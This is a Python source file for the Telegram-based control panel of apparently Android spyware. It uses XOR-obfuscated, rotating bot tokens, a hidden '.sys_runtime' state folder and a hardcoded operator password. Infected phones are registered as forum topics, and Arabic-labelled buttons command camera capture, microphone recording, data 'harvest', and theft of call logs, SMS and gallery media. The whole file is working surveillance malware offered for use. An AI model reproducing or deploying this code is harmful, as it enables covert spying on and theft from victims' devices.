# -*- coding: utf-8 -*-
import os, time, json, random, threading, logging, requests, sys

P = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(P):
    os.makedirs(P)
if P not in sys.path:
    sys.path.insert(0, P)

logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR, filemode='a')

def _x(b, k=0x5A):
    return bytes([c ^ k for c in b])

_enc = [
    b'mcbclboljh`\x1b\x1b\x1c\x08\x1b\r\x0332\x1c\x0ci\x0c"l\x02\x15\x0f\x10#09\x0e\x15\x00\x035b9\x0eo\x1e\n\x10\x0b',
    b'bkkihcihnn`\x1b\x1b\x1c\x1c-\x0e\x12\x00o\x1d15\x0ci\x1e\x14bb0?\x0fb\x02/\x172\x10<j\x11\x16\x0e)<n',
    b'bilcojliik`\x1b\x1b\x1c8\x17/\x0fo\x14)\x0c\n\r\nc#cmm"\x1d\x056\x16;\x1dkw*>\x1d\x18)w\x0b',
    b'bmikockinn`\x1b\x1b\x1fh;1\x0b.#\x18\n\x16\x14\x008 2"10"\x03\x1e=\x0bn453\x12\x051?\x035',
    b'bnnnocklhn`\x1b\x1b\x12bn\x0532i\x03\x0f7n(\x1f\x0f\x05j \x0c4\x03h\x12jo\x0b\x0e00#\x17)\x00\x13',
    b'bonkmjmkjl`\x1b\x1b\x12\x10\x1c3h\x0com\x12(# \x0317\x1bh\x1c\x18=\x1c\x179?.<+\x0b\x193h0\x17',
    b'blooihlmkm`\x1b\x1b\x1c\x03\x15kh\x17\x0e\x1d6\x19k2<./?,\x14.\x10(6k#\x1c\x1b\x1ew<oc))',
    b'blocjjlikh`\x1b\x1b\x1d*i\x18"\x1e#.\x08<\x12\x0c8\x02\x19)*;/"\x15\x1c-m,\x0c-#c"3l)',
    b'bmknhmhiol`\x1b\x1b\x1d=0+\x13\t\x10\x00\x08\x1f3h\x0f\x0f7\x00oi9*\x10"\x0f\x082\x1ek)5\x1c\x15\x0f1',
    b'bmhjlillch`\x1b\x1b\x1f=.\x192\x0f\rc"\x198\x1d\x11\x15;1-.\x10\x18h\x101\t\x0bk\x10\x02(\x16k\x12\x13'
]

def _d():
    return [_x(e).decode() for e in _enc]

class T:
    def __init__(self, m):
        self.m = m
        self.df = os.path.join(P, "dvs.json")
        self.sf = os.path.join(P, "ses.json")
        self.af = os.path.join(P, "adm.json")
        self.ses = {}
        self.dvs = {}
        self.adm = {}
        self.p_upd = set()   # منع تكرار الأوامر (idempotency)
        all_t = _d()
        self.act = all_t[:6]
        self.bak = all_t[6:]
        self.cur = 0
        self.cmd = "-1003365166986"
        self.dat = "-1003787520015"
        self.rn = True
        self._ld()
        threading.Thread(target=self._ka, daemon=True).start()

    def _ld(self):
        for f, d in [(self.df, self.dvs), (self.sf, self.ses), (self.af, self.adm)]:
            if os.path.exists(f):
                try:
                    with open(f, 'r') as fp:
                        d.update(json.load(fp))
                except:
                    pass

    def _sv(self):
        try:
            for p, d in [(self.df, self.dvs), (self.sf, self.ses), (self.af, self.adm)]:
                with open(p, 'w') as f:
                    json.dump(d, f)
        except:
            pass

    def _tk(self, fb=False):
        if fb and self.bak:
            return random.choice(self.bak)
        self.cur = (self.cur + 1) % len(self.act)
        return self.act[self.cur]

    def _ka(self):
        while self.rn:
            for t in self.bak:
                try:
                    requests.get(f"https://api.telegram.org/bot{t}/getMe", timeout=10)
                except:
                    pass
            time.sleep(3600)

    def _ap(self, met, d=None, f=None, fb=False, retry=2):
        """إرسال طلب مع إعادة محاولة تلقائية عند فشل الشبكة"""
        for attempt in range(retry + 1):
            t = self._tk(fb)
            try:
                r = requests.post(f"https://api.telegram.org/bot{t}/{met}", data=d, files=f, timeout=25, verify=False)
                j = r.json()
                if not j.get('ok') and j.get('error_code') == 429:
                    time.sleep(2)
                    continue
                return j
            except Exception as e:
                if attempt == retry:
                    logging.error(f"API call failed after {retry+1} attempts: {met} - {e}")
                time.sleep(1.5)
        return None

    def reg(self, did, mod):
        if did in self.dvs:
            return self.dvs[did].get('t')
        r = self._ap("createForumTopic", {"chat_id": self.cmd, "name": f"📱 {mod[:10]} | {did[:4]}"})
        if r and r.get('ok'):
            tid = r['result']['message_thread_id']
            self.dvs[did] = {"n": mod, "t": tid}
            self._sv()
            self._ap("sendMessage", {
                "chat_id": self.cmd,
                "message_thread_id": tid,
                "text": f"<b>✅ ON</b>\n<b>{mod}</b>",
                "parse_mode": "HTML"
            })
            return tid
        return None

    def _km(self):
        return {"inline_keyboard": [
            [{"text": "📱 الأجهزة", "callback_data": "ld"}],
            [{"text": "👥 المشرفين", "callback_data": "la"}, {"text": "🔄 تجديد", "callback_data": "rnw"}],
            [{"text": "🚪 خروج", "callback_data": "ext"}]
        ]}

    def _kd(self, did):
        return {"inline_keyboard": [
            [{"text": "📸 خلفية", "callback_data": f"cam_{did}"}, {"text": "🤳 أمامية", "callback_data": f"camf_{did}"}],
            [{"text": "🎙️ تسجيل", "callback_data": f"mic_{did}"}, {"text": "📦 حصاد", "callback_data": f"hrv_{did}"}],
            [{"text": "📞 سجلات", "callback_data": f"callog_{did}"}, {"text": "💬 رسائل", "callback_data": f"sms_{did}"}],
            [{"text": "🖼️ المعرض", "callback_data": f"media_{did}"}],
            [{"text": "🔙 عودة", "callback_data": "ld"}]
        ]}

    def _auth(self, cid):
        return time.time() < self.ses.get(str(cid), 0)

    def _pm(self, u):
        m = u.get('message', {})
        cid = m.get('chat', {}).get('id')
        t = m.get('text', '')
        try:
            from monitor import _pw as secret
        except:
            secret = "Zaen123@123@123"

        if t.startswith("/login"):
            parts = t.split()
            upw = parts[1] if len(parts) > 1 else ""
            if upw == secret:
                self.ses[str(cid)] = time.time() + 7200
                self.m.auth_active = True
                self._sv()
                self._ap("sendMessage", {
                    "chat_id": cid,
                    "text": "🔓 <b>تم الدخول بنجاح</b>",
                    "reply_markup": json.dumps(self._km()),
                    "parse_mode": "HTML"
                })
            else:
                self._ap("sendMessage", {"chat_id": cid, "text": "❌ <b>كلمة السر خاطئة</b>", "parse_mode": "HTML"})
        elif self._auth(cid) and t == "/menu":
            self._ap("sendMessage", {
                "chat_id": cid,
                "text": "📋 <b>القائمة الرئيسية</b>",
                "reply_markup": json.dumps(self._km()),
                "parse_mode": "HTML"
            })

    def _pc(self, u):
        cb = u.get('callback_query', {})
        uid = cb.get('id')
        # منع تكرار معالجة نفس الضغطة
        if uid in self.p_upd:
            return
        self.p_upd.add(uid)
        if len(self.p_upd) > 200:
            self.p_upd.clear()

        cid = cb.get('message', {}).get('chat', {}).get('id')
        mid = cb.get('message', {}).get('message_id')
        d = cb.get('data', '')

        try:
            self._ap("answerCallbackQuery", {"callback_query_id": uid})
        except:
            pass

        if not self._auth(cid):
            self._ap("sendMessage", {"chat_id": cid, "text": "⚠️ الجلسة منتهية. يرجى /login مجدداً."})
            return

        if d == "main":
            self._ap("editMessageText", {
                "chat_id": cid,
                "message_id": mid,
                "text": "📋 القائمة الرئيسية",
                "reply_markup": json.dumps(self._km())
            })
        elif d == "ld":
            if not self.dvs:
                self._ap("editMessageText", {
                    "chat_id": cid,
                    "message_id": mid,
                    "text": "📭 لا توجد أجهزة متصلة حالياً.",
                    "reply_markup": json.dumps({"inline_keyboard": [[{"text": "🔙 عودة", "callback_data": "main"}]]})
                })
                return
            kb = {"inline_keyboard": [[{"text": f"📱 {v['n']}", "callback_data": f"dev_{k}"}] for k, v in self.dvs.items()] + [[{"text": "🔙 عودة", "callback_data": "main"}]]}
            self._ap("editMessageText", {
                "chat_id": cid,
                "message_id": mid,
                "text": "<b>اختر جهازاً للتحكم:</b>",
                "reply_markup": json.dumps(kb),
                "parse_mode": "HTML"
            })
        elif d.startswith("dev_"):
            did = d.split("_")[1]
            if did in self.dvs:
                self._ap("editMessageText", {
                    "chat_id": cid,
                    "message_id": mid,
                    "text": f"🕹️ التحكم بـ: <b>{self.dvs[did]['n']}</b>",
                    "reply_markup": json.dumps(self._kd(did)),
                    "parse_mode": "HTML"
                })
        elif d == "rnw":
            self.ses[str(cid)] = time.time() + 3600
            self._sv()
            self._ap("answerCallbackQuery", {"callback_query_id": uid, "text": "تم تجديد الجلسة ✅"})
        elif d == "ext":
            self.ses.pop(str(cid), None)
            self._sv()
            self._ap("editMessageText", {"chat_id": cid, "message_id": mid, "text": "🔒 تم تسجيل الخروج."})
        else:
            try:
                import commands
                commands.ex(d, self, self.m, cid, uid)
            except Exception as e:
                logging.error(f"Command execution error: {e}")

    def _pl(self):
        off = -1
        idx = 0
        while self.rn:
            try:
                t = self.act[idx]
                resp = requests.get(
                    f"https://api.telegram.org/bot{t}/getUpdates?offset={off}&limit=5&timeout=15",
                    timeout=20,
                    verify=False
                ).json()
                if resp and resp.get('ok'):
                    for u in resp.get('result', []):
                        off = u['update_id'] + 1
                        if 'message' in u:
                            self._pm(u)
                        if 'callback_query' in u:
                            self._pc(u)
                else:
                    idx = (idx + 1) % len(self.act)
            except:
                idx = (idx + 1) % len(self.act)
                time.sleep(2)
            time.sleep(0.3)

    def start(self):
        threading.Thread(target=self._pl, daemon=True).start()


def _():
    return "".join([chr(x) for x in [90, 97, 101, 110, 49, 50, 51, 64, 49, 50, 51, 64]])
